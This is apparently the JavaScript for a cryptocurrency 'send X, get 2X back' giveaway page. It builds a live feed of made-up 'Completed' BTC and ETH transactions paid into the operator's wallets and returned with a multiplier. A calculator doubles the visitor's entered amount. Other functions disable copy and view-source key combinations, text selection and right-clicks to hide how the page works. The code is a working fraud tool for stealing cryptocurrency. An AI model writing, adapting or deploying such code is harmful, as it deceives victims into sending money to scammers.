const {
    wallet_btc,
    wallet_eth,
    min_btc,
    max_btc,
    min_eth,
    max_eth,
    multiplier,
} = window.cdata;

function lerp(start, end, amt){
    return (1 - amt) * start + amt * end;
}

$(document).ready(function () {
    function randomString(len, charSet) {
        charSet = charSet || "ABCDEFabcdef0123456789";
        var randomString = "";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            randomString += charSet.substring(randomPoz, randomPoz + 1);
        }
        return randomString;
    }

    function randomNumber(min, max) {
        return min + Math.random() * (max + 1 - min);
    }

    function createTableItem() {
        const coin = Math.random() > 0.5 ? "BTC" : "ETH";

        let wallet_from = '';
        let wallet_to = '';
        let send_amount = 0;
        let get_amount = 0;
        let txhash = '';
        let block = randomString(6, "123456789");
        let fee = 0;

        if (coin === 'BTC') {
            wallet_from = '1' + randomString(11) + "...";
            wallet_to = wallet_btc;
            
            const max_lerp = lerp(min_btc, max_btc, 0.05);
            send_amount = randomNumber(min_btc, max_lerp);
            get_amount = send_amount * multiplier;

            fee = (send_amount / 100000).toFixed(8);
            send_amount = send_amount.toFixed(8);
            get_amount = get_amount.toFixed(8);
            
            txhash = randomString(10) + '...';
        } else if (coin === 'ETH') {
            wallet_from = '0x' + randomString(11) + "...";
            wallet_to = wallet_eth;
            
            const max_lerp = lerp(min_eth, max_eth, 0.05);
            send_amount = randomNumber(min_eth, max_lerp);
            get_amount = send_amount * multiplier;

            fee = (send_amount / 100000).toFixed(5);
            send_amount = send_amount.toFixed(5);
            get_amount = get_amount.toFixed(5);

            txhash = '0x' + randomString(8) + '...';
        }

        let row = `<div class="transaction-item">
            <p class="txhash">${txhash}</p>
            <p class="block">${block}</p>
            <p class="from">${wallet_to}<br>${wallet_from}</p>
            <div class="arrow"><img src="assets/check.svg" alt=""></div>
            <p class="to">${wallet_from}<br>${wallet_to}</p>
            <p class="value">${get_amount} ${coin}<br>${send_amount} ${coin}</p>
            <p class="fee">${fee}</p>
            <p class="status">Completed</p>
        </div>`;

        $(row).hide().prependTo(".transaction-content").fadeIn("slow");
        $('.transaction-item:eq(10)').remove();
    }

    for (let i = 0; i <= 10; i++) {
        createTableItem();
    }
    setInterval(createTableItem, 15500);

    $('a[href^="#"]').click(function () {
        var target = $(this).attr('href');
        $('html, body').animate({scrollTop: $(target).offset().top - 50}, 500);
        return false;
    });

    $("input[name=input]").ForceNumericOnly().keyup(function () {
        let amount = parseFloat($(this).val());
        amount = !isNaN(amount) ? amount * 2 : 0;
        $("#calculator_number").text(amount.toLocaleString());
    });

    $(".participate-button").click(function () {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200);
        setTimeout(() => $(this).parents(".participate-item").find(".address-done").fadeOut(200), 1000);
    });
});

function round(value, decimals) {
    return Number(Math.round(value + 'e' + decimals) + 'e-' + decimals);
}

function copy(text) {
    var input = document.createElement('textarea');
    input.innerHTML = text;
    document.body.appendChild(input);
    input.select();
    var status = document.execCommand('copy');
    document.body.removeChild(input);
}

jQuery.fn.ForceNumericOnly = function () {
    return this.each(function () {
        $(this).keydown(function (e) {
            var key = e.charCode || e.keyCode || 0;
            return (key == 8 || key == 46 || key == 190 || (key >= 35 && key <= 40) || (key >= 48 && key <= 57) || (key >= 96 && key <= 105));
        });
    });
};

function kill_ctrl_key_combo(e) {
    var forbiddenKeys = new Array('a', 'c', 'x', 's', 'u');
    var key;
    var isCtrl;
    if (window.event) {
        key = window.event.keyCode;
        if (window.event.ctrlKey) isCtrl = true;
        else isCtrl = false;
    } else {
        key = e.which;
        if (e.ctrlKey) isCtrl = true;
        else isCtrl = false;
    }
    if (isCtrl) {
        for (i = 0; i < forbiddenKeys.length; i++) { //case-insensitive comparation
            if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                return false;
            }
        }
    }
    return true;
}

function disable_selection(target) {
    if (typeof target.style.MozUserSelect != "undefined") {
        target.style.MozUserSelect = "none";
    }
    target.style.cursor = "default";
}

function double_mouse(e) {
    if (e.which == 2 || e.which == 3) {
        return false;
    }
    return true;
}


